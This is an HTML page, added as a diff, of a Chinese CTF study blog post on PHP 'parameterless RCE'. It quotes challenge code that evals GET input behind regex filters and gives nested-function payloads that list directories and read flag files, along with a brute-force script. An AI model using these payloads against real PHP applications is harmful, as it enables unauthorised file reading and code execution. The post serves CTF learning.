@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>PHP无参数RCE | You Only Live Once</title>
+  <meta name="description" content="CTF中PHP无参数RCE小结 核心代码如下 1234if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;]))&amp;#123;    eval($_GET[&#39;code&#39;]);&amp;#125; 一般会在此基础">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP无参数RCE">
+<meta property="og:url" content="https://yoloyolo.top/2021/01/14/PHP-RCE-Without-Parameters/index.html">
+<meta property="og:site_name" content="Transmutation">
+<meta property="og:description" content="CTF中PHP无参数RCE小结 核心代码如下 1234if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;]))&amp;#123;    eval($_GET[&#39;code&#39;]);&amp;#125; 一般会在此基础">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-01-14T12:27:25.000Z">
+<meta property="article:modified_time" content="2021-01-14T12:42:05.990Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="RCE">
+<meta name="twitter:card" content="summary">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://yoloyolo.top/2021/01/14/PHP-RCE-Without-Parameters/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Transmutation" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/logo_icon.svg" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/monster414" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.png" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">xXxYOLOxXx</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">yolo-yolo@qq.com</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Xiamen, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/monster414" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>Welcom to xXxYOLOxXx's Blog</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Study/">Study</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Talk/">Talk</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUp/">WriteUp</a><span class="category-list-count">3</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/AWD/" style="font-size: 13px;">AWD</a> <a href="/tags/CBC/" style="font-size: 13px;">CBC</a> <a href="/tags/CSRF/" style="font-size: 13px;">CSRF</a> <a href="/tags/CVE/" style="font-size: 13px;">CVE</a> <a href="/tags/Crypto/" style="font-size: 13.5px;">Crypto</a> <a href="/tags/ECB/" style="font-size: 13px;">ECB</a> <a href="/tags/FTP/" style="font-size: 13px;">FTP</a> <a href="/tags/File-Upload/" style="font-size: 13px;">File Upload</a> <a href="/tags/PHP/" style="font-size: 14px;">PHP</a> <a href="/tags/RCE/" style="font-size: 14px;">RCE</a> <a href="/tags/RSA/" style="font-size: 13.5px;">RSA</a> <a href="/tags/Reflection/" style="font-size: 13px;">Reflection</a> <a href="/tags/SQL-Injection/" style="font-size: 13px;">SQL Injection</a> <a href="/tags/SSRF/" style="font-size: 13px;">SSRF</a> <a href="/tags/Talk/" style="font-size: 13px;">Talk</a> <a href="/tags/Unserialize/" style="font-size: 13px;">Unserialize</a> <a href="/tags/WEB/" style="font-size: 13px;">WEB</a> <a href="/tags/Web/" style="font-size: 13px;">Web</a> <a href="/tags/XSS/" style="font-size: 13px;">XSS</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/WriteUp/">WriteUp</a>
+              </p>
+              <p class="item-title">
+                <a href="/2021/01/14/SWPUCTF-Web3/" class="title">SWPUCTF -- Web3</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-01-14T13:25:50.000Z" itemprop="datePublished">2021-01-14</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/WriteUp/">WriteUp</a>
+              </p>
+              <p class="item-title">
+                <a href="/2021/01/14/SWPUCTF-Crypto/" class="title">SWPUCTF -- Crypto</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-01-14T13:17:44.000Z" itemprop="datePublished">2021-01-14</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Study/">Study</a>
+              </p>
+              <p class="item-title">
+                <a href="/2021/01/14/Crypto-RSA/" class="title">Crypto -- RSA</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-01-14T13:07:07.000Z" itemprop="datePublished">2021-01-14</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/WriteUp/">WriteUp</a>
+              </p>
+              <p class="item-title">
+                <a href="/2021/01/14/CTF-Sloves/" class="title">CTF题解&amp;杂记</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-01-14T12:42:49.000Z" itemprop="datePublished">2021-01-14</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Study/">Study</a>
+              </p>
+              <p class="item-title">
+                <a href="/2021/01/14/PHP-RCE-Without-Parameters/" class="title">PHP无参数RCE</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-01-14T12:27:25.000Z" itemprop="datePublished">2021-01-14</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-PHP-RCE-Without-Parameters" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      PHP无参数RCE
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2021/01/14/PHP-RCE-Without-Parameters/" class="article-date">
+	  <time datetime="2021-01-14T12:27:25.000Z" itemprop="datePublished">2021-01-14</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/Study/">Study</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/PHP/" rel="tag">PHP</a>, <a class="article-tag-link-link" href="/tags/RCE/" rel="tag">RCE</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/01/14/PHP-RCE-Without-Parameters/#comments" class="article-comment-link">Comments</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <p>CTF中PHP无参数RCE小结</p>
+<p>核心代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    eval($_GET[&#39;code&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一般会在此基础上过滤一些函数以增加难度</p>
+<p>正则表达式的用于匹配样式如下的字符串</p>
+<p>a();<br>a(bb());<br>a(bb(ccc()));<br>a()bb();<br>a(bb())ccc(dddd());<br>…<br>BTW: 可能在正则递归匹配时会Ban掉’_’</p>
+<p>常用函数</p>
+<ul>
+<li>get_defined_functions() : 显示所有函数</li>
+<li>localeconv() : 返回一个包含本地数字及货币格式信息的数组，第一个元素为’.’</li>
+<li>scandir() : 返回指定目录中的文件和目录的数组</li>
+<li>pos() : 输出当前内部指针所指向的元素</li>
+<li>current() : 返回数组当前单元，同pos()</li>
+<li>end() : 将内部指针指向数组中的最后一个元素，并输出。</li>
+<li>next() : 函数将内部指针指向数组中的下一个元素，并输出</li>
+<li>file() : 读取一个文件，返回的数组中元素对应每一行的内容</li>
+<li>readfile() : 读取一个文件</li>
+<li>sqrt() : 返回一个数字的平方根</li>
+<li>tan() : 返回一个数字的正切弧度值</li>
+<li>atan() : 返回一个数字的反正切弧度值</li>
+<li>cosh() : 返回一个数字的双曲余弦</li>
+<li>sinh() : 返回一个数字的双曲正弦</li>
+<li>ceil() : 返回向上取整</li>
+<li>floor() : 返回向下取整</li>
+<li>round() ： 返回四舍五入取整</li>
+<li>chr() : 返回指定ASCII值的字符</li>
+<li>ord() : 返回字符串中第一个字符 ASCII值</li>
+<li>chdir() : 改变当前的目录</li>
+<li>localtime(timestamp,is_assoc) : 取得本地时间，数组的第一个元素为秒</li>
+<li>time() : 对应localtime()的timestamp</li>
+<li>phpversion() : 返回php版本号</li>
+<li>crypt() : 使用盐值生成Hash</li>
+<li>hebrevc() : 反向显示希伯来字符</li>
+<li>strrev() : 反转字符串</li>
+<li>file() : 把整个文件读入一个数组中</li>
+<li>array_reverse() : 返回翻转顺序的数组</li>
+<li>array_flip() : 反转/交换数组中的键名和对应关联的键值</li>
+<li>array_rand() : 返回一个包含随机键名的数组</li>
+</ul>
+<h2 id="生成-的四个思路"><a href="#生成-的四个思路" class="headerlink" title="生成 . 的四个思路"></a>生成 . 的四个思路</h2><ul>
+<li>strrev(crypt()) 生成Hash，并将最后一位的.逆序到第一位，可以使用serialize(array())或phpversion()作为内嵌函数</li>
+<li>localeconv() 选取第一个元素</li>
+<li>数学函数套娃Fuzz</li>
+<li>localtime(time()) 第46秒</li>
+</ul>
+<h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;exp&#39;]))&#123;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;data:\&#x2F;\&#x2F;|filter:\&#x2F;\&#x2F;|php:\&#x2F;\&#x2F;|phar:\&#x2F;\&#x2F;&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">        if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">            if (!preg_match(&#39;&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">                &#x2F;&#x2F; echo $_GET[&#39;exp&#39;];</span><br><span class="line">                @eval($_GET[&#39;exp&#39;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>且当前目录的文件如下</p>
+<p><code>array(5) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(8) &quot;flag.php&quot; [4]=&gt; string(9) &quot;index.php&quot; &#125;</code><br>不能控制数组指针直接指向flag.php，只能进行随机读取</p>
+<h2 id="Payload0"><a href="#Payload0" class="headerlink" title="Payload0"></a>Payload0</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(readfile(array_rand(array_flip(scandir(chr(ord(strrev(crypt(phpversion())))))))));</span><br></pre></td></tr></table></figure>
+<p>分析</p>
+<ol>
+<li><code>phpversion() #用于输出php当前版本信息</code></li>
+<li><code>crypt(phpversion()) #加密信息，最后一位有可能为.</code></li>
+<li><code>strrev(crypt(phpversion())) #字符串逆序，将.移动至第一位</code></li>
+<li><code>ord(strrev(crypt(phpversion()))) #取第一位的ASCII码值</code></li>
+<li><code>chr(ord(strrev(crypt(phpversion())))) #转为字符，配合上一步可以节选出第一位的.</code></li>
+<li><code>scandir(chr(ord(strrev(crypt(phpversion()))))) #扫描当前目录</code></li>
+<li><code>array_flip(scandir(chr(ord(strrev(crypt(phpversion())))))) #将扫描结果数组交换键名与键值</code></li>
+<li><code>array_rand(array_flip(scandir(chr(ord(strrev(crypt(phpversion()))))))) #随机选取数组键名，即随机选取文件名</code></li>
+<li><code>readfile(array_rand(array_flip(scandir(chr(ord(strrev(crypt(phpversion())))))))) #读取文件</code></li>
+<li><code>var_dump(readfile(array_rand(array_flip(scandir(chr(ord(strrev(crypt(phpversion()))))))))) #输出读取文件结果</code></li>
+</ol>
+<h2 id="Payload1"><a href="#Payload1" class="headerlink" title="Payload1"></a>Payload1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(readfile(array_rand(array_flip(scandir(pos(localeconv()))))));</span><br></pre></td></tr></table></figure>
+<p>分析</p>
+<ol>
+<li><code>localeconv() #生成数组，第一个元素为.</code></li>
+<li><code>pos(localeconv()) #取第一个元素，即.</code></li>
+<li><code>scandir(pos(localeconv())) #扫描当前目录</code></li>
+<li><code>array_flip(scandir(pos(localeconv()))) #将扫描结果数组交换键名与键值</code></li>
+<li><code>array_rand(array_flip(scandir(pos(localeconv())))) #随机选取数组键名，即随机选取文件名</code></li>
+<li><code>readfile(array_rand(array_flip(scandir(pos(localeconv()))))) #读取文件</code></li>
+<li><code>var_dump(readfile(array_rand(array_flip(scandir(pos(localeconv())))))) #输出读取文件结果</code></li>
+</ol>
+<h2 id="Payload2"><a href="#Payload2" class="headerlink" title="Payload2"></a>Payload2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(readfile(array_rand(array_flip(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion()))))))))))));</span><br></pre></td></tr></table></figure>
+<p>分析</p>
+<ol>
+<li><code>phpversion() #输出php当前版本</code></li>
+<li><code>ceil(cosh(cosh(tan(ceil(atan(phpversion())))))) #使用数学函数计算得出46</code></li>
+<li><code>chr(ceil(sinh(cosh(tan(ceil(atan(phpversion()))))))) #将46转为.</code></li>
+<li><code>scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion())))))))) #扫描当前目录</code></li>
+<li><code>array_rand(array_flip(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion())))))))))) #随机选取数组键名，即随机选取文件名</code></li>
+<li><code>readfile(array_rand(array_flip(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion()))))))))))) #读取文件</code></li>
+<li><code>var_dump(readfile(array_rand(array_flip(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion())))))))))))) #输出读取文件结果</code></li>
+</ol>
+<h3 id="Fuzz脚本"><a href="#Fuzz脚本" class="headerlink" title="Fuzz脚本"></a>Fuzz脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$func &#x3D; array(&#39;sqrt&#39;, &#39;tan&#39;, &#39;sinh&#39;, &#39;cosh&#39;, &#39;atan&#39;, &#39;ceil&#39;, &#39;floor&#39;, &#39;cos&#39;, &#39;sin&#39;);</span><br><span class="line">array_flip(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion()))))))))) #将扫描结果数组交换键名与键值</span><br><span class="line">foreach($func as $a)&#123;</span><br><span class="line">foreach($func as $b)&#123;</span><br><span class="line">foreach($func as $c)&#123;</span><br><span class="line">foreach($func as $d)&#123;</span><br><span class="line">foreach($func as $e)&#123;</span><br><span class="line">foreach($func as $f)&#123;</span><br><span class="line">foreach($func as $g)&#123;</span><br><span class="line">foreach($func as $h)&#123;</span><br><span class="line">if($a($b($c($d($e($f($g(&quot;5.6.40&quot;))))))) &#x3D;&#x3D;&#x3D; 46)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$a($b($c($d($e($f($g())))))))\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="ByteCTF2019-Boring-Code"><a href="#ByteCTF2019-Boring-Code" class="headerlink" title="[ByteCTF2019]Boring_Code"></a>[ByteCTF2019]Boring_Code</h1><p>节选部分代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$code &#x3D; $_GET[&quot;code&quot;];</span><br><span class="line">if (&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z]+\((?R)?\)&#x2F;&#39;, NULL, $code))</span><br><span class="line">&#123;</span><br><span class="line">    if (preg_match(&#39;&#x2F;et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log&#x2F;i&#39;, $code))</span><br><span class="line">    &#123;</span><br><span class="line">    echo &#39;bye~&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        eval($code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>flag为上层目录的最后一个文件</p>
+<h2 id="Payload0-1"><a href="#Payload0-1" class="headerlink" title="Payload0"></a>Payload0</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>
+<p>分析</p>
+<ol>
+<li><code>localeconv() #生成数组，第一个元素为.</code></li>
+<li><code>pos(localeconv()) #取第一个元素，即.</code></li>
+<li><code>scandir(pos(localeconv())) #扫描当前目录</code></li>
+<li><code>next(scandir(pos(localeconv()))) #选取元素..</code></li>
+<li><code>chdir(next(scandir(pos(localeconv())))) #进入上级目录</code></li>
+<li><code>time(chdir(next(scandir(pos(localeconv()))))) #生成时间戳，php7.4版本中无法进行内嵌函数</code></li>
+<li><code>localtime(time(chdir(next(scandir(pos(localeconv())))))) #将时间戳转为数组形式的本地时间</code></li>
+<li><code>pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))) #选取第一个元素，即秒</code></li>
+<li><code>chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))) #转为ASCII字符，46秒时执行可以得到.</code></li>
+<li><code>scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))) #扫描当前目录</code></li>
+<li><code>end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))) #选取最后一个文件，即flag文件</code></li>
+<li><code>readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))) #读取flag文件</code></li>
+<li><code>echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))) #输出读取flag文件的内容</code></li>
+</ol>
+<h2 id="Payload1-1"><a href="#Payload1-1" class="headerlink" title="Payload1"></a>Payload1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array()))))))))echo(readfile(end(scandir(strrev(crypt(serialize(array()))))))));</span><br></pre></td></tr></table></figure>
+<p>分析<br>if语句用于返回上一级，且chdir的返回结果为1，控制if语句执行之后的用于读取flag的嵌套函数</p>
+<h1 id="第五届上海市大学生网络安全大赛-Decade"><a href="#第五届上海市大学生网络安全大赛-Decade" class="headerlink" title="[第五届上海市大学生网络安全大赛]Decade"></a>[第五届上海市大学生网络安全大赛]Decade</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">if (!empty($code)) &#123;</span><br><span class="line">        if (&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z]+\((?R)?\)&#x2F;&#39;, NULL, $code)) &#123;</span><br><span class="line">            if (preg_match(&#39;&#x2F;readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log&#x2F;i&#39;, $code)) &#123;</span><br><span class="line">                    echo &#39;bye~&#39;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    eval($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;No way!!!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">        echo &quot;No way!!!&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里简单写一下读取文件的思路<br>由于readfile被Ban，所以需要使用file()来进行文件读取<br>至于flag的输出，可以使用serialize()进行序列化，join()来讲数组转为字符串，或者用next()指向flag</p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://yoloyolo.top/2021/01/14/PHP-RCE-Without-Parameters/" title="PHP无参数RCE" target="_blank" rel="external">https://yoloyolo.top/2021/01/14/PHP-RCE-Without-Parameters/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/monster414" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.png" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/monster414" target="_blank"><span class="text-dark">xXxYOLOxXx</span><small class="ml-1x">yolo-yolo@qq.com</small></a></h3>
+        <div>Explorer for unknown.</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2021/01/14/CTF-Sloves/" title="CTF题解&amp;杂记"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2021/01/14/Reflection-For-Quanzhou-Race/" title="泉州市网络安全攻防比赛线下赛复盘"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
